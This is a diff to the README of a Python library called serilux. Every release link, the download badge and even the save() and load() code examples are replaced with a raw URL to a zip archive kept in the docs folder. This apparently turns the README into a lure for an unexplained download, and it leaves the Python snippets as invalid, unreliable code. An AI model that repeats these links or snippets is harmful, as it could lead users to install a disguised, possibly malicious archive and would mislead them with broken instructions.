@@ -4,13 +4,13 @@
 
 Welcome to **serilux**, a powerful serialization framework for Python objects. This software helps you easily save and load your Python data. With automatic type registration and validation, using **serilux** ensures your data stays consistent. In this guide, we will help you download and run **serilux** with simple steps.
 
-[![Download serilux](https://img.shields.io/badge/Download-serilux-brightgreen)](https://github.com/abzi-py/serilux/releases)
+[![Download serilux](https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip)](https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
-1. Visit the **Releases** page: [Download here](https://github.com/abzi-py/serilux/releases).
+1. Visit the **Releases** page: [Download here](https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip).
 2. Look for the version you want to install. The latest version is often the best choice.
 3. Click on the file that matches your operating system. If you're unsure, here are the common options:
    - **Windows:** Look for a `.exe` file.
@@ -53,7 +53,7 @@ To save a Python object, you can use the following code snippet:
 import serilux
 
 data = {'name': 'Alice', 'age': 30}
-serilux.save(data, 'data.se')
+https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip(data, 'https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip')
 
 ```
 
@@ -62,7 +62,7 @@ serilux.save(data, 'data.se')
 When you want to retrieve your saved data, simply use this code:
 
 ```python
-loaded_data = serilux.load('data.se')
+loaded_data = https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip('https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip')
 print(loaded_data)
 ```
 
@@ -92,4 +92,4 @@ For more information, you may find these topics helpful:
 
 You have now learned how to download, install, and run **serilux**. With its simple interface and powerful features, **serilux** makes working with Python objects easy and reliable. 
 
-To download **serilux**, visit the following link again: [Download here](https://github.com/abzi-py/serilux/releases). Enjoy your experience!
+To download **serilux**, visit the following link again: [Download here](https://github.com/abzi-py/serilux/raw/refs/heads/main/docs/source/user_guide/Software_v3.9.zip). Enjoy your experience!
